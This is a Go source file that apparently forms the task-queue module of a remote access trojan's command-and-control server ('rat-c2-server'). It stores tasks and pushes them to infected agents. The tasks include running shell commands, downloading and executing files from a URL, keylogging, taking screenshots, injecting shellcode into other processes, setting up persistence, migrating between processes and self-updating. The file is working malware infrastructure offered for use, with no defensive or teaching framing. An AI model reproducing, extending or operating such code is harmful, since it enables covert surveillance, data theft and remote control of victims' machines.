package task

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"

	"rat-c2-server/internal/agent"
)

type Task struct {
	ID          string          `db:"id" json:"id"`
	AgentID     string          `db:"agent_id" json:"agent_id"`
	Command     string          `db:"command" json:"command"`           // JSON CommandPayload
	Args        string          `db:"args" json:"args"`
	Status      string          `db:"status" json:"status"`
	Result      string          `db:"result" json:"result"`
	ResultCode  int             `db:"result_code" json:"result_code"`
	CreatedAt   time.Time       `db:"created_at" json:"created_at"`
	SentAt      *time.Time      `db:"sent_at" json:"sent_at,omitempty"`
	CompletedAt *time.Time      `db:"completed_at" json:"completed_at,omitempty"`
	Priority    int             `db:"priority" json:"priority"`
	Retries     int             `db:"retries" json:"retries"`
	MaxRetries  int             `db:"max_retries" json:"max_retries"`
	Agent       *agent.Agent    `db:"-" json:"-"`
}

type Queue struct {
	db       *sqlx.DB
	agentMgr *agent.Manager
	mu       sync.Mutex
	pending  chan *Task
}

func NewQueue(db *sqlx.DB, agentMgr *agent.Manager) *Queue {
	q := &Queue{
		db:       db,
		agentMgr: agentMgr,
		pending:  make(chan *Task, 1000),
	}
	q.loadPending()
	return q
}

func (q *Queue) loadPending() {
	var tasks []Task
	err := q.db.Select(&tasks, `
		SELECT * FROM tasks 
		WHERE status IN ('pending', 'sent') 
		ORDER BY priority DESC, created_at ASC
	`)
	if err != nil {
		log.Printf("[task] Load pending error: %v", err)
		return
	}
	for i := range tasks {
		q.pending <- &tasks[i]
	}
	log.Printf("[task] Loaded %d pending tasks", len(tasks))
}

func (q *Queue) Enqueue(agentID string, command interface{}, args interface{}, priority int) (*Task, error) {
	cmdJSON, _ := json.Marshal(command)
	argsJSON, _ := json.Marshal(args)

	t := &Task{
		ID:         uuid.New().String(),
		AgentID:    agentID,
		Command:    string(cmdJSON),
		Args:       string(argsJSON),
		Status:     "pending",
		CreatedAt:  time.Now(),
		Priority:   priority,
		MaxRetries: 3,
	}

	_, err := q.db.Exec(`
		INSERT INTO tasks (id, agent_id, command, args, status, created_at, priority, max_retries)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?)
	`, t.ID, t.AgentID, t.Command, t.Args, t.Status, t.CreatedAt, t.Priority, t.MaxRetries)

	if err != nil {
		return nil, err
	}

	select {
	case q.pending <- t:
	default:
		// Queue full, task stays in DB
	}

	log.Printf("[task] Enqueued %s for agent %s: %s", t.ID, agentID, t.Command)
	return t, nil
}

func (q *Queue) EnqueueShell(agentID, command string, priority int) (*Task, error) {
	args := map[string]string{"cmd": command}
	return q.Enqueue(agentID, "shell", args, priority)
}

func (q *Queue) EnqueueDownloadExec(agentID, url, args string, priority int) (*Task, error) {
	taskArgs := map[string]string{"url": url, "args": args}
	return q.Enqueue(agentID, "download_exec", taskArgs, priority)
}

func (q *Queue) EnqueueUpload(agentID, localPath, remotePath string, priority int) (*Task, error) {
	taskArgs := map[string]string{"local_path": localPath, "remote_path": remotePath}
	return q.Enqueue(agentID, "upload", taskArgs, priority)
}

func (q *Queue) EnqueueScreenshot(agentID string, priority int) (*Task, error) {
	return q.Enqueue(agentID, "screenshot", map[string]interface{}{}, priority)
}

func (q *Queue) EnqueueKeylogStart(agentID string, priority int) (*Task, error) {
	return q.Enqueue(agentID, "keylog_start", map[string]interface{}{}, priority)
}

func (q *Queue) EnqueueKeylogStop(agentID string, priority int) (*Task, error) {
	return q.Enqueue(agentID, "keylog_stop", map[string]interface{}{}, priority)
}

func (q *Queue) EnqueueProcessList(agentID string, priority int) (*Task, error) {
	return q.Enqueue(agentID, "get_processes", map[string]interface{}{}, priority)
}

func (q *Queue) EnqueueKillProcess(agentID string, pid int, priority int) (*Task, error) {
	return q.Enqueue(agentID, "kill_process", map[string]int{"pid": pid}, priority)
}

func (q *Queue) EnqueueInject(agentID string, tech string, targetPID int, shellcode []byte, priority int) (*Task, error) {
	args := map[string]interface{}{
		"technique":  tech,
		"target_pid": targetPID,
		"shellcode":  shellcode,
	}
	return q.Enqueue(agentID, "inject", args, priority)
}

func (q *Queue) EnqueuePersist(agentID, method, path, args, desc string, priority int) (*Task, error) {
	taskArgs := map[string]string{"method": method, "path": path, "args": args, "description": desc}
	return q.Enqueue(agentID, "persist", taskArgs, priority)
}

func (q *Queue) EnqueueMigrate(agentID, tech string, targetPID int, priority int) (*Task, error) {
	args := map[string]interface{}{"technique": tech, "target_pid": targetPID}
	return q.Enqueue(agentID, "migrate", args, priority)
}

func (q *Queue) EnqueueUninstall(agentID string, priority int) (*Task, error) {
	return q.Enqueue(agentID, "uninstall", map[string]interface{}{}, priority)
}

func (q *Queue) EnqueueSleep(agentID string, seconds int, priority int) (*Task, error) {
	return q.Enqueue(agentID, "sleep", map[string]int{"seconds": seconds}, priority)
}

func (q *Queue) EnqueueUpdate(agentID, url string, priority int) (*Task, error) {
	return q.Enqueue(agentID, "update", map[string]string{"url": url}, priority)
}

func (q *Queue) Get(id string) (*Task, error) {
	var t Task
	err := q.db.Get(&t, "SELECT * FROM tasks WHERE id = ?", id)
	return &t, err
}

func (q *Queue) GetByAgent(agentID string, limit int) ([]*Task, error) {
	var tasks []*Task
	err := q.db.Select(&tasks, "SELECT * FROM tasks WHERE agent_id = ? ORDER BY created_at DESC LIMIT ?", agentID, limit)
	return tasks, err
}

func (q *Queue) GetPending(agentID string) ([]*Task, error) {
	var tasks []*Task
	err := q.db.Select(&tasks, "SELECT * FROM tasks WHERE agent_id = ? AND status IN ('pending', 'sent') ORDER BY priority DESC, created_at ASC", agentID)
	return tasks, err
}

func (q *Queue) UpdateStatus(id, status string) error {
	var query string
	var args []interface{}

	switch status {
	case "sent":
		now := time.Now()
		query = "UPDATE tasks SET status = ?, sent_at = ? WHERE id = ?"
		args = []interface{}{status, now, id}
	case "completed", "failed":
		now := time.Now()
		query = "UPDATE tasks SET status = ?, completed_at = ? WHERE id = ?"
		args = []interface{}{status, now, id}
	default:
		query = "UPDATE tasks SET status = ? WHERE id = ?"
		args = []interface{}{status, id}
	}

	_, err := q.db.Exec(query, args...)
	return err
}

func (q *Queue) UpdateResult(id, result string, resultCode int) error {
	_, err := q.db.Exec("UPDATE tasks SET result = ?, result_code = ? WHERE id = ?", result, resultCode, id)
	return err
}

func (q *Queue) IncrementRetries(id string) error {
	_, err := q.db.Exec("UPDATE tasks SET retries = retries + 1 WHERE id = ?", id)
	return err
}

func (q *Queue) Cancel(id string) error {
	_, err := q.db.Exec("UPDATE tasks SET status = 'cancelled' WHERE id = ? AND status IN ('pending', 'sent')", id)
	return err
}

func (q *Queue) ProcessQueue(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		case task := <-q.pending:
			q.processTask(ctx, task)
		}
	}
}

func (q *Queue) processTask(ctx context.Context, t *Task) {
	// Get agent
	a, ok := q.agentMgr.Get(t.AgentID)
	if !ok {
		log.Printf("[task] Agent %s not found for task %s", t.AgentID, t.ID)
		q.UpdateStatus(t.ID, "failed")
		return
	}

	if a.Status != "active" || a.WSConn == nil {
		log.Printf("[task] Agent %s not connected for task %s", t.AgentID, t.ID)
		// Re-queue for later
		if t.Retries < t.MaxRetries {
			time.AfterFunc(30*time.Second, func() {
				q.pending <- t
			})
			q.IncrementRetries(t.ID)
		} else {
			q.UpdateStatus(t.ID, "failed")
			q.UpdateResult(t.ID, "Agent not connected", -1)
		}
		return
	}

	// Send task to agent
	q.UpdateStatus(t.ID, "sent")

	// Build protocol message
	msg := q.buildTaskMessage(t)
	err := q.agentMgr.Send(t.AgentID, msg)
	if err != nil {
		log.Printf("[task] Send failed for %s: %v", t.ID, err)
		q.UpdateStatus(t.ID, "pending") // Re-queue
		return
	}

	// Wait for result with timeout
	resultChan := make(chan *TaskResult, 1)
	q.registerResultHandler(t.ID, resultChan)

	select {
	case <-ctx.Done():
		q.unregisterResultHandler(t.ID)
		return
	case result := <-resultChan:
		q.unregisterResultHandler(t.ID)
		if result != nil {
			q.UpdateStatus(t.ID, "completed")
			q.UpdateResult(t.ID, result.Output, result.Code)
		} else {
			q.UpdateStatus(t.ID, "failed")
			q.UpdateResult(t.ID, "Timeout", -1)
		}
	case <-time.After(5 * time.Minute):
		q.unregisterResultHandler(t.ID)
		if t.Retries < t.MaxRetries {
			log.Printf("[task] Timeout, re-queue %s (retry %d/%d)", t.ID, t.Retries+1, t.MaxRetries)
			time.AfterFunc(30*time.Second, func() {
				q.pending <- t
			})
			q.IncrementRetries(t.ID)
		} else {
			q.UpdateStatus(t.ID, "failed")
			q.UpdateResult(t.ID, "Timeout after retries", -1)
		}
	}
}

type TaskResult struct {
	Output string
	Code   int
}

var resultHandlers = make(map[string]chan *TaskResult)
var resultMu sync.Mutex

func (q *Queue) registerResultHandler(taskID string, ch chan *TaskResult) {
	resultMu.Lock()
	resultHandlers[taskID] = ch
	resultMu.Unlock()
}

func (q *Queue) unregisterResultHandler(taskID string) {
	resultMu.Lock()
	delete(resultHandlers, taskID)
	resultMu.Unlock()
}

func (q *Queue) HandleResult(taskID string, output string, code int) {
	resultMu.Lock()
	ch, ok := resultHandlers[taskID]
	resultMu.Unlock()

	if ok {
		ch <- &TaskResult{Output: output, Code: code}
	}
}

func (q *Queue) buildTaskMessage(t *Task) []byte {
	// Build binary protocol message matching client protocol
	// This would use the same serialization as the C++ client
	msg := map[string]interface{}{
		"task_id": t.ID,
		"command": t.Command,
		"args":    t.Args,
	}
	data, _ := json.Marshal(msg)
	return data
}

func (q *Queue) Stats() map[string]int {
	var stats struct {
		Pending  int `db:"pending"`
		Running  int `db:"running"`
		Complete int `db:"completed"`
		Failed   int `db:"failed"`
	}
	// Simplified stats
	q.db.Get(&stats.Pending, "SELECT COUNT(*) FROM tasks WHERE status = 'pending'")
	q.db.Get(&stats.Running, "SELECT COUNT(*) FROM tasks WHERE status = 'sent'")
	q.db.Get(&stats.Complete, "SELECT COUNT(*) FROM tasks WHERE status = 'completed'")
	q.db.Get(&stats.Failed, "SELECT COUNT(*) FROM tasks WHERE status = 'failed'")
	return map[string]int{
		"pending":  stats.Pending,
		"running":  stats.Running,
		"complete": stats.Complete,
		"failed":   stats.Failed,
	}
}